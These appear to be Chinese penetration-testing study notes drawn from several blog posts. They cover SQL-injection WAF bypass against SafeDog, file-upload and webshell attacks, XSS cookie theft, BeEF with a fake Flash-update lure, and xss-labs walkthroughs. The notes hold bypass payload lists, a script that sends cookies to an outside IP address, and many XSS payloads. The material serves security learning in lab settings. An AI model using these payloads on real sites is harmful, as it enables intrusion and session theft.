id=-1 union /*//--/*/     /*!--+/*%0aselect/*!1,2,3*/  --+
</code></pre>
<p>Http参数污染（https://www.cnblogs.com/xishaonian/p/6209441.html）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633745725334.png" alt="" loading="lazy"><br>
参数污染举例及原理：</p>
<pre><code>?id=1/**&amp;id=-1 union select 1,2,3 #*/ 
</code></pre>
<p>安全狗接受的</p>
<pre><code>1/**&amp;id=-1 union select 1,2,3 #*/        
</code></pre>
<p>网站接受的（apache中get污染特性https://blog.csdn.net/weixin_43872099/article/details/104926292）</p>
<pre><code>-1 union select 1,2,3 #*/       执行的语句  
</code></pre>
<p>apche接受的是上面这个语句，#将后面的都注释掉了<br>
安全狗接受的语句中有注释符号，起到注释作用，正常情况没法执行，安全狗直接忽略。</p>
<p>主要是利用参数污染来导致网站和安全狗接受数据的不一致性，实现绕过的操作</p>
<pre><code>id=1%23a%&amp;id=-1%20union%20select%201,2,3%23
</code></pre>
<p>演示案例<br>
WAF 部署-安全狗,宝塔等 waf 搭建部署</p>
<p>简要讲解安全狗,宝塔等防护 waf 策略规则</p>
<p>简要演示安全狗 bypass sqlinject 防护规则（以sqli-labs/Less-2为例子）</p>
<p>在安全狗开启的情况下，我们对其进行注入，发现被拦截<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633746157483.png" alt="" loading="lazy"></p>
<p>在这里，我们尝试改变提交方式。尝试用Post方法进行，发现没被拦截，但网页显示不正常，我们可以知道网站不允许进行post方式传值<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633746161744.png" alt="" loading="lazy"></p>
<p>我们对源代码进行修改，将提交数据方式改为request方式，让它也能够通过post接受数据，发现能够可以正常注入<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633746174743.png" alt="" loading="lazy"></p>
<p>​ 这种情况说明提交方式绕过WAF，前提是网站支持各种方式的接受（如request），我们利用post和get都可以提交，get有防护但是post没有防护的话，我们可以转化提交方式进行注入操作</p>
<p>接着进行注入操作，发现当我们查询数据库名的时候，又被拦截了，说明安全狗拦截不仅是一方面而已<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633746179034.png" alt="" loading="lazy"></p>
<p>通过查询安全狗的防护措施，我们可以发现有对应的规则进行防护<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633746182574.png" alt="" loading="lazy"></p>
<p>这时候我们发现即使更改提交方式还是被拦截，接下来我们就要对数据进行处理，对数据进行变异操作后再进行注入，我们尝试使用特殊符号（其中之一）对数据进行处理</p>
<p>绕过的关键点:绕过匹配规则，同时不干扰语句的正常执行</p>
<p>我们将database（）改成<code>database/**/()</code>，你会发现我们绕过了，成功获取到数据库名<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633746189211.png" alt="" loading="lazy"></p>
<p>我们对源代码再进行修改，将提交数据方式改回get方式，需要注意到的是安全狗中get方式拦截规则更多，用相同的语句进行注入，被拦截了（查询拦截规则＋自己验证知道，union select联合查询这个点触发规则被拦截了）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633746193968.png" alt="" loading="lazy"></p>
<p>绕过思路主要是让union和select这个不在一起即可，那我们进行特殊符号进行干扰<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633746200351.png" alt="" loading="lazy"></p>
<p>实测简易 CMS 头部注入漏洞 Bypass 原理分析</p>
<p>利用安全狗没有检测http头部进行绕过操作（2020年安全狗）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633746204473.png" alt="" loading="lazy"><br>
涉及资源<br>
https://www.cnblogs.com/backlion/p/9721687.html</p>
<p>https://blog.csdn.net/nzjdsds/article/details/93740686</p>
<p>#应用层</p>
<p>大小写/关键字替换<br>
id=1 UnIoN/**/SeLeCT 1,user()<br>
Hex() bin() 等价于 ascii()<br>
Sleep() 等价于 benchmark()<br>
Mid()substring() 等价于 substr()<br>
@@user 等价于 User()<br>
@@Version 等价于 version()</p>
<p>各种编码<br>
大小写，URL，hex，%0A 等</p>
<p>注释使用</p>
<pre><code>// -- --+ # /**/ + :%00 /!**/等
</code></pre>
<p>再次循环<br>
union==uunionnion</p>
<p>等价替换<br>
user()=@@user() and=&amp; or=| ascii=hex 等</p>
<p>参数污染<br>
?id=1&amp;id=2&amp;id=3</p>
<p>编码解码及加密解密<br>
s-&gt;%73-&gt;%25%37%33<br>
hex,unlcode,base64 等</p>
<p>更改请求提交方式<br>
GET POST COOKIE 等<br>
POST-&gt;multipart/form-data</p>
<p>中间件 HPP 参数污染</p>
<p>#数据库特性</p>
<p>1、Mysql 技巧<br>
（1）mysql 注释符有三种：<br>
#、/<em>...</em>/、-- ... (注意--后面有一个空格)<br>
（2）空格符</p>
<pre><code>:[0x09,0x0a-0x0d,0x20,0xa0]
</code></pre>
<p>（3）特殊符号：%a 换行符</p>
<pre><code>可结合注释符使用%23%0a，%2d%2d%0a。 
</code></pre>
<p>（4）内联注释：</p>
<pre><code>/*!UnIon12345SelEcT*/ 1,user() //数字范围 1000-50540
</code></pre>
<p>（5）mysql 黑魔法</p>
<pre><code>select{x username}from {x11 test.admin};
</code></pre>
<p>2、SQL Server 技巧</p>
<pre><code>（1）用来注释掉注射后查询的其余部分：
/* C 语言风格注释
\-- SQL 注释
; 00％ 空字节
（2）空白符：[0x01-0x20]
（3）特殊符号：%3a 冒号
id=1 union:select 1,2 from:admin
（4）函数变形：如 db_name[空白字符]()
</code></pre>
<p>3、Oracle 技巧</p>
<pre><code>（1）注释符：--、/**/
（2）空白字符：[0x00,0x09，0x0a-0x0d,0x20]
</code></pre>
<p>4.配合 FUZZ<br>
select * from admin where id=1【位置一】union【位置二】select【位置三】1,2,db_name()【位置四】from【位置五】admin</p>
<p>————————————————<br>
版权声明：本文为CSDN博主「是阿明呐」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_45889197/article/details/119956015</p>
<h1 id="2021-10-10">2021-10-10</h1>
<p>#文件上传之基础及过滤方式</p>
<figure data-type="image" tabindex="19"><img src="https://jinqipiaopiao.github.io//post-images/1633827971553.png" alt="" loading="lazy"></figure>
<p><strong>什么是文件上传漏洞？</strong><br>
凡是存在文件上传的地方它均有可能存在文件上传漏洞，关于上传文件操作的时候对方代码写的是否完整、是否安全，一旦疏忽了某个地方可能会造成文件上传漏洞。</p>
<p><strong>文件上传漏洞由哪些危害？</strong><br>
文件可以自定义，可以成为webshell，通过文件上传来上传网站后门，直接获取网站权限，属于高危漏洞。</p>
<p><strong>文件上传漏洞如何查找及判断？</strong><br>
1.黑盒查找。文件后台、会员中心、文件扫描。<br>
2.白盒查找。通过代码分析到上传漏洞、查找文件上传功能。</p>
<p><strong>文件上传漏洞有哪些需要注意的地方？</strong><br>
对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期测试。</p>
<figure data-type="image" tabindex="20"><img src="https://jinqipiaopiao.github.io//post-images/1633827978130.png" alt="" loading="lazy"></figure>
<p>演示案例<br>
常规文件上传地址的获取说明</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633827983855.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633827988815.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633827992708.png" alt="" loading="lazy"></p>
<p>不同格式下的文件类型后门测试</p>
<figure data-type="image" tabindex="21"><img src="https://jinqipiaopiao.github.io//post-images/1633827998391.png" alt="" loading="lazy"></figure>
<p>不要妄想通过一个图片你能带着你的后门来控制网站。什么格式代码就用什么格式去执行。</p>
<figure data-type="image" tabindex="22"><img src="https://jinqipiaopiao.github.io//post-images/1633828020026.png" alt="" loading="lazy"></figure>
<p>配合解析漏洞下的文件类型后门测试</p>
<pre><code>nginx解析漏洞 https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/
</code></pre>
<figure data-type="image" tabindex="23"><img src="https://jinqipiaopiao.github.io//post-images/1633828031381.png" alt="" loading="lazy"></figure>
<p>解析漏洞：对方在解析上的混乱</p>
<figure data-type="image" tabindex="24"><img src="https://jinqipiaopiao.github.io//post-images/1633828037364.png" alt="" loading="lazy"></figure>
<p>本地文件上传漏洞靶场环境搭建测试</p>
<pre><code>https://github.com/c0ny1/upload-labs
</code></pre>
<figure data-type="image" tabindex="25"><img src="https://jinqipiaopiao.github.io//post-images/1633828183368.png" alt="" loading="lazy"></figure>
<p>HP称为后端语言是因为它的代码和你前端执行源代码是不同的。<br>
前端：代码直接在浏览器上执行。(不安全)<br>
后端：发送到对方服务器脚本里面，脚本在去验证去判断。<br>
前端代码过滤，删除这段代码</p>
<figure data-type="image" tabindex="26"><img src="https://jinqipiaopiao.github.io//post-images/1633828188369.png" alt="" loading="lazy"></figure>
<p>某CMS及CVE编号文件上传漏洞测试<br>
上传操作是用JS提交，在浏览器前端完成，所以抓不到包</p>
<figure data-type="image" tabindex="27"><img src="https://jinqipiaopiao.github.io//post-images/1633828192637.png" alt="" loading="lazy"></figure>
<p>改成PHP</p>
<figure data-type="image" tabindex="28"><img src="https://jinqipiaopiao.github.io//post-images/1633828197646.png" alt="" loading="lazy"></figure>
<p>修改uid为3</p>
<figure data-type="image" tabindex="29"><img src="https://jinqipiaopiao.github.io//post-images/1633828201901.png" alt="" loading="lazy"></figure>
<h1 id="2021-10-12">2021-10-12</h1>
<h1 id="订单cookie窃取和shell箱子反杀">订单cookie窃取和shell箱子反杀</h1>
<p><strong>通过提交订单的方式植入xss来获取网站管理员cookie</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634040985645.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634040989749.png" alt="" loading="lazy"></p>
<p><strong>简单测试</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634040993232.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634040996922.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041001569.png" alt="" loading="lazy"></p>
<p><strong>窃取cookie</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041005682.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041010292.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041016364.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041020276.png" alt="" loading="lazy"></p>
<p>https://www.postman.com/downloads/下载postman<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041025740.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041029543.png" alt="" loading="lazy"></p>
<p>本地构造实现xss攻击1<br>
本地服务器端39.96.44.170 文件jieshou.php<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041038244.png" alt="" loading="lazy"></p>
<pre><code>&lt;script&gt;
new Image().src =
&quot;http://39.96.44.170/jieshou.php?c=&quot; + encodeURI(document.cookie);
&lt;/script&gt;
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634041043950.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041048482.png" alt="" loading="lazy"></p>
<p>方法2<br>
<strong>本地加载js脚本</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041053351.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041059246.png" alt="" loading="lazy"></p>
<p><strong>webshell沙箱反杀</strong><br>
就是使用别人的webshell来进行获取服务器shell，但获取shell后webshell存在的恶意代码就会把网站信息和webshell密码，和用户名发到webshell的原主人来进行信息收集，通过大量获取的网站shell来进行贩卖，而使用webshell的人就成打工仔了<br>
反杀的意思就是像上面的窃取cookie道理一样通过向webshell的代码中插入窃取cookie的代码，当webshell 原注入查看沙箱时就会触发xss窃取cookie来达到反客为主！<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041064099.png" alt="" loading="lazy"></p>
<p>webshell 中的恶意代码<br>
把网站信息发送到指定地址<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041070329.png" alt="" loading="lazy"></p>
<p><strong>成功发送到沙箱</strong></p>
<p><strong>反杀操作</strong><br>
webshell中的恶意代码</p>
<figure data-type="image" tabindex="30"><img src="https://jinqipiaopiao.github.io//post-images/1634041075367.png" alt="" loading="lazy"></figure>
<p><strong>通过访问webshll来植入xss代码窃取cookie</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041081896.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041089713.png" alt="" loading="lazy"></p>
<p><strong>殊不知cooKie已被窃取</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041095673.png" alt="" loading="lazy"></p>
<p><strong>登录沙箱后台</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041100850.png" alt="" loading="lazy"></p>
<p><strong>演示存在后门的大马</strong><br>
通过打开webshell进行抓包测试发现向恶意网站发送信息<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041105669.png" alt="" loading="lazy"></p>
<p><strong>发送的代码</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041111745.png" alt="" loading="lazy"></p>
<p><strong>内容为网站地址和webshell密码</strong></p>
<p><strong>beef结合xss攻击</strong><br>
启动beef<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041118387.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041125054.png" alt="" loading="lazy"></p>
<p><strong>后台管理员查看订单触发xss</strong><br>
成功上线<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041132976.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041142548.png" alt="" loading="lazy"></p>
<p><strong>社工攻击(利用flash更新)</strong><br>
利用模拟flash更新向客户端发送请求，来实现下载后门<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041148881.png" alt="" loading="lazy"><br>
客户端显示<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041152952.png" alt="" loading="lazy"></p>
<p><strong>点击就下载后门</strong><br>
<strong>获取session思路</strong><br>
<strong>因为当访问php探针时就会携带session</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041157643.png" alt="" loading="lazy"></p>
<p>如果能利用xss让管理员页面跳转到phpinfo()页面，通过返回页面源码就能窃取session</p>
<p><strong>利用beef进行页面跳转</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041164166.png" alt="" loading="lazy"></p>
<p><strong>获取页面源码</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041175723.png" alt="" loading="lazy"></p>
<p><strong>获取源码中的cookie和session</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041179842.png" alt="" loading="lazy"></p>
<p>————————————————<br>
版权声明：本文为CSDN博主「是偉臦道长啊」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_54252904/article/details/117134382</p>
<h1 id="2021-10-15">2021-10-15</h1>
<h1 id="web漏洞-xss跨站之代码绕过与httponly绕过">WEB漏洞-XSS跨站之代码绕过与httpOnly绕过</h1>
<p><strong>什么是HTTPonly？</strong><br>
如果您在cookie中设置了httponly属性，那么通过js脚本将无法读取到cookie信息，这样就能有效的防止xss攻击，具体一点的介绍：<br>
（HTTP only是微软对cookie做的扩展，这个主要是解决用户的cookie可能被盗用的问题。<br>
大家都知道当我们去邮箱或者论坛登陆后，服务器会写一些cookie到我们的浏览器，当下次再访问其他页面是，由于浏览器会自动传递cookie，这样就实现了一次登录就可以看到，所有需要登录后才能看到的内容，也就是说，实质上，所有的登陆状态这些都是建立在cookie上的，假设我们登录后的cookie被人获取，那就会有暴露个人信息的危险，当然想一想，其他人怎么可能可以获取客户的cookie呢，那必然是有不怀好意的人的程序在浏览器里面运行，如果是现在满天飞的流氓软件，那没有办法，HTTPonly也不是用来解决这种情况的，它是用来解决浏览器里卖弄javascript访问cookie的问题，一个flash程序在你的浏览器里面运行就可以获取你的cookie</p>
<figure data-type="image" tabindex="31"><img src="https://jinqipiaopiao.github.io//post-images/1634269549791.png" alt="" loading="lazy"></figure>
<p>作用：仅仅是防止通过js脚本读取到cookie信息，虽然设置了httponly之后拿不到cookie，但是还是存在xss跨站，阻止的是获取cookie</p>
<p>对方开启HTTP only你在盗取cookie失败的情况下可以采用其他方案<br>
登录后台权限方式<br>
1.以cookie形式<br>
2.直接账号密码登录：<br>
保存账号密码读取：通过读取他保存在本地的数据（需要xss产生于登录地址，利用表单劫持）</p>
<figure data-type="image" tabindex="32"><img src="https://jinqipiaopiao.github.io//post-images/1634269553582.png" alt="" loading="lazy"></figure>
<p>type，id，name通过查看网站源代码中的登录框表单</p>
<figure data-type="image" tabindex="33"><img src="https://jinqipiaopiao.github.io//post-images/1634269557915.png" alt="" loading="lazy"></figure>
<p>没保存账号密码读取：通过表单（登录框）劫持数据（产生在后台的xss，例如存储型xss留言等）</p>
<figure data-type="image" tabindex="34"><img src="https://jinqipiaopiao.github.io//post-images/1634269561370.png" alt="" loading="lazy"></figure>
<p>劫持原理：抓取数据包另外发送一份跨站平台</p>
<figure data-type="image" tabindex="35"><img src="https://jinqipiaopiao.github.io//post-images/1634269566442.png" alt="" loading="lazy"></figure>
<p>但是如果是https网站的话，数据是进行了ssl加密，获取了数据后也是很难读取到密码账号的，鸡肋方法</p>
<p>手工判断xss跨站漏洞<br>
靶场：xss_labs<br>
常用代码<br>
<strong>echo</strong></p>
<pre><code>echo
&lt;?php echo&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;
?&gt;
</code></pre>
<p><strong>img标签</strong></p>
<pre><code>&lt;img src=javascript:alert(&quot;xss&quot;)&gt;
&lt;IMG SRC=javascript:alert(String.formCharCode(88,83,83))&gt;
&lt;img src=&quot;URL&quot; style='Xss:expression(alert(xss));'&gt;
&lt;img src=&quot;x&quot; onerror=alert(1)&gt;
&lt;img src=&quot;x&quot; onerror=eval(&quot;alert('xss')&quot;)&gt;
&lt;img src=x onmouseover=alert('xss')&gt;
</code></pre>
<p><strong>css</strong></p>
<pre><code>&lt;img STYLE=&quot;background-image:url(javascript:alert('XSS'))&quot;&gt;
</code></pre>
<p><strong>href</strong></p>
<pre><code>标准格式
&lt;a href=&quot;https://www.baidu.com&quot;&gt;百度&lt;/a&gt;
xss利用格式1
&lt;a href=&quot;javascript:alert(1)&quot;&gt;aaa&lt;/a&gt;
&lt;a href=javascript:eval(alert(1))&gt;aa&lt;/a&gt;
&lt;a href=&quot;javascript:aaa&quot; onmouseover=&quot;alert(/xss)&quot;&gt;aa&lt;/a&gt;
利用格式2
&lt;script&gt;alert(1)&lt;/script&gt;
&lt;a href=&quot;&quot; onclick=alert(2)&gt;aa&lt;/a&gt;
利用格式3
&lt;a href=&quot;&quot; onclick=eval(alert(1))&gt;aa&lt;/a&gt;
利用格式4
&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt('xss') y=2016&gt;aa&lt;/a&gt;
</code></pre>
<p><strong>form标签</strong></p>
<pre><code>xss利用方式1
&lt;form action=javascript:alert('xss') method=&quot;get&quot;&gt;
&lt;form action=javascript:alert('xss')&gt;
xss利用方式2
&lt;form method=post action=aa.asp? onmouseover=prompt('xss')&gt;
&lt;form method=post action=aa.asp? onmouseover=alert('xss')&gt;
&lt;form action=1 onmouseover=alert('xss')&gt;
</code></pre>
<p><strong>input标签</strong></p>
<pre><code>标准格式
&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;
1.&lt;input value=&quot;&quot; onclick=alert(1) type=&quot;text&quot;&gt;
2.&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt('xss') bad=&quot;&quot;&gt;
3.&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;
</code></pre>
<p><strong>iframe</strong></p>
<pre><code>XSS利用方式1
&lt;iframe src=javascript:alert('xss');height=5width=1000 /&gt;&lt;iframe&gt;
XSS利用方式2
&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;
&lt;!--原code--&gt;
&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert('xss')&lt;/script&gt;&quot;&gt;
&lt;!--base64编码--&gt;
&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;
XSS利用方式3
&lt;iframe src=&quot;aaa&quot; οnmοuseοver=alert('xss') /&gt;&lt;iframe&gt;
XSS利用方式3
&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;&quot;&gt;&lt;/iframe&gt;
</code></pre>
<p><strong>svg标签</strong></p>
<pre><code>&lt;svg onload=alert(1)&gt;
</code></pre>
<p><strong>level 1</strong><br>
直接在name赋值个弹窗即可<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634295771067.png" alt="" loading="lazy"><br>
<strong>level 2(&quot;&gt;闭合标签绕过)</strong><br>
尝试赋值</p>
<pre><code>&lt;script&gt;alert()&lt;/script&gt;
</code></pre>
<p>发现失败，查看源代码<br>
发现存在一个htmlspecialchars转化函数<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634295775611.png" alt="" loading="lazy"><br>
分析发现这个函数是将字符串实体化了<br>
htmlspecialchars() 函数把预定义的字符转换为 HTML 实体， 把符号转换为实体化标签，xss经常过滤的情况。<br>
预定义的字符是：</p>
<pre><code>&amp; （和号）成为 &amp;
&quot; （双引号）成为 &quot;
’ （单引号）成为 ’
&lt; （小于）成为 &lt;
&gt; （大于）成为 &gt;
</code></pre>
<p>实例：</p>
<pre><code>&lt;?php
$str=&quot;this is a &lt;b&gt;test&lt;/b&gt;&quot;;
echo $str;
echo &quot;&lt;br&gt;&quot;;
echo htmlspecialchars($str);
?&gt;
</code></pre>
<p>结果：</p>
<figure data-type="image" tabindex="36"><img src="https://jinqipiaopiao.github.io//post-images/1634295781091.png" alt="" loading="lazy"></figure>
<p>所以我们不能使用带&lt;&gt;的进行payload，都是回显的地方由两处，第二个地方是没有函数转义的</p>
<figure data-type="image" tabindex="37"><img src="https://jinqipiaopiao.github.io//post-images/1634295784755.png" alt="" loading="lazy"></figure>
<p>所以我们可以闭合前面的input语句，然后加入alert</p>
<pre><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<figure data-type="image" tabindex="38"><img src="https://jinqipiaopiao.github.io//post-images/1634295789577.png" alt="" loading="lazy"></figure>
<p>如何判断是双引号闭合还是单引号闭合<br>
拿level2为例子<br>
输入'<br>
审查元素</p>
<figure data-type="image" tabindex="39"><img src="https://jinqipiaopiao.github.io//post-images/1634295809698.png" alt="" loading="lazy"></figure>
<p>输入&quot;<br>
审查元素</p>
<figure data-type="image" tabindex="40"><img src="https://jinqipiaopiao.github.io//post-images/1634295813626.png" alt="" loading="lazy"></figure>
<p>输入1<br>
审查元素</p>
<figure data-type="image" tabindex="41"><img src="https://jinqipiaopiao.github.io//post-images/1634295819019.png" alt="" loading="lazy"></figure>
<p>三者对比，可知是双引号闭合</p>
<p><strong>level 3（事件绕过+'符号闭合）</strong><br>
测试上述两种代码发现都不行，查看源代码发现两处的字符串都被htmlspecialchars函数转义了，所以我们不能使用&lt;&gt;来payload，那么我们可以利用鼠标点击事件进行payload</p>
<figure data-type="image" tabindex="42"><img src="https://jinqipiaopiao.github.io//post-images/1634295825327.png" alt="" loading="lazy"></figure>
<p>payload语句</p>
<pre><code>'οnclick='alert(1)
</code></pre>
<p>前面的单引号与value的左边的单引号闭合，后面的双引号与value的右边的单引号闭合<br>
提交后如何点击输入框成功</p>
<figure data-type="image" tabindex="43"><img src="https://jinqipiaopiao.github.io//post-images/1634295829597.png" alt="" loading="lazy"></figure>
<p><strong>level 4（事件绕过+&quot;符号闭合）</strong><br>
测试第3关的代码发现不行，f12查看元素发现</p>
<figure data-type="image" tabindex="44"><img src="https://jinqipiaopiao.github.io//post-images/1634295834453.png" alt="" loading="lazy"></figure>
<p>value因为是双引号没有闭合掉，所以我们将单引号改为双引号即可通过</p>
<pre><code>&quot;οnclick=&quot;alert(1)
</code></pre>
<p><strong>level 5（herf绕过+符号闭合）</strong><br>
尝试使用</p>
<pre><code>“οnclick=&quot;alert(1)
</code></pre>
<p>发现on进行替换变成o_n,那么我们就不能使用鼠标事件了</p>
<figure data-type="image" tabindex="45"><img src="https://jinqipiaopiao.github.io//post-images/1634295839867.png" alt="" loading="lazy"></figure>
<p>查看元素，发现这个函数可能是在input里面执行的，那么我们可以将<code>&lt;input</code>闭合掉</p>
<figure data-type="image" tabindex="46"><img src="https://jinqipiaopiao.github.io//post-images/1634295845152.png" alt="" loading="lazy"></figure>
<p>使用如下代码发现script也被替换了</p>
<pre><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<figure data-type="image" tabindex="47"><img src="https://jinqipiaopiao.github.io//post-images/1634295853094.png" alt="" loading="lazy"></figure>
<p>那么我们可以借助a herf属性，自己创建一个javascript代码</p>
<pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;
</code></pre>
<p>然后点击输入框附近的链接即可成功。</p>
<p><strong>level 6（大小写绕过）</strong><br>
使用前5次的payload，发现都不行，on，src，herf都被替换了</p>
<figure data-type="image" tabindex="48"><img src="https://jinqipiaopiao.github.io//post-images/1634295869788.png" alt="" loading="lazy"></figure>
<p>关键字都被过滤，使用大写替绕过</p>
<pre><code>&quot;&gt;&lt;a hRef=&quot;javaScript:alert(1)&quot;&gt;
</code></pre>
<p><strong>level 7（双写绕过）</strong><br>
发现大写也无法绕过了，查看源代码发现有小写函数</p>
<figure data-type="image" tabindex="49"><img src="https://jinqipiaopiao.github.io//post-images/1634295876803.png" alt="" loading="lazy"></figure>
<p>都是发现不是替换成o_n而是将on直接变成空字符，那么我们可以双写进行绕过</p>
<pre><code>&quot;&gt;&lt;a hhrefref=&quot;javasscriptcript:alert(1)&quot;&gt;
</code></pre>
<p><strong>level 8（编码绕过）</strong><br>
大小写，双写均不行，替换为unicode编码</p>
<figure data-type="image" tabindex="50"><img src="https://jinqipiaopiao.github.io//post-images/1634295883329.png" alt="" loading="lazy"></figure>
<p><strong>level 9（特殊绕过）</strong><br>
查看代码，发现代码会检测是否存在http://</p>
<figure data-type="image" tabindex="51"><img src="https://jinqipiaopiao.github.io//post-images/1634295889476.png" alt="" loading="lazy"></figure>
<pre><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;/*http://*/
</code></pre>
<p><strong>less 10（type绕过）</strong><br>
f12查看元素发现</p>
<figure data-type="image" tabindex="52"><img src="https://jinqipiaopiao.github.io//post-images/1634295894746.png" alt="" loading="lazy"></figure>
<p>但是type是hidden，被隐藏了，所以我们必须都试一次</p>
<pre><code>t_sort=&quot;&gt;&lt;οnclick=&quot;alert(1)&quot; type='text'&gt;
</code></pre>
<p><strong>level 11（referer头绕过）</strong></p>
<figure data-type="image" tabindex="53"><img src="https://jinqipiaopiao.github.io//post-images/1634295900283.png" alt="" loading="lazy"></figure>
<p>http referer 头，检测来源。<br>
浏览器会检测此JS代码是否来自CSRF跨站请求脚本。检测来源，</p>
<figure data-type="image" tabindex="54"><img src="https://jinqipiaopiao.github.io//post-images/1634295905032.png" alt="" loading="lazy"></figure>
<p>如果管理员在登录状态的情况下，进入攻击方的带有登录时触发了添加管理员账号和密码的漏洞的网站，那么就会导致后台添加了新的账号和密码<br>
如何防范：检测来源，也就是浏览器的同源策略，看看是否来自同一个域名，不是同一个域名的不接受。<br>
token验证会解决这个问题<br>
此关卡在referer头输入即可</p>
<pre><code>t_sort=&quot;&gt;&lt;οnclick=&quot;alert(1)&quot; type='text'&gt;
</code></pre>
<figure data-type="image" tabindex="55"><img src="https://jinqipiaopiao.github.io//post-images/1634295912396.png" alt="" loading="lazy"></figure>
<p><strong>level 12（agent绕过）</strong></p>
<figure data-type="image" tabindex="56"><img src="https://jinqipiaopiao.github.io//post-images/1634295918012.png" alt="" loading="lazy"></figure>
<p>payload:</p>
<pre><code>t_sort=&quot;&gt;&lt;οnclick=&quot;alert(1)&quot; type='text'&gt;
</code></pre>
<figure data-type="image" tabindex="57"><img src="https://jinqipiaopiao.github.io//post-images/1634295926147.png" alt="" loading="lazy"></figure>
<p><strong>level 13（cookie绕过）</strong><br>
抓包发现有cookie<br>
尝试在cookie后面加入</p>
<pre><code>t_sort=&quot;&gt;&lt;οnclick=&quot;alert(1)&quot; type='text'&gt;
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634295932725.png" alt="" loading="lazy"><br>
成功</p>
<p><strong>level 14</strong><br>
<strong>level 15（文件包含）</strong><br>
审查元素</p>
<figure data-type="image" tabindex="58"><img src="https://jinqipiaopiao.github.io//post-images/1634295940027.png" alt="" loading="lazy"></figure>
<p>可以看到我们提交的参数src的值被插入到了标签的class属性值中，但是前面还有ng-include这样的字符。<br>
ng-include是angular js中的东西，其作用相当于php的include函数。这里就是将1.gif这个文件给包含进来。<br>
先尝试看看能不能直接闭合标签来触发弹窗</p>
<figure data-type="image" tabindex="59"><img src="https://jinqipiaopiao.github.io//post-images/1634295945599.png" alt="" loading="lazy"></figure>
<p>看出被实体化了<br>
先看看源文件的代码</p>
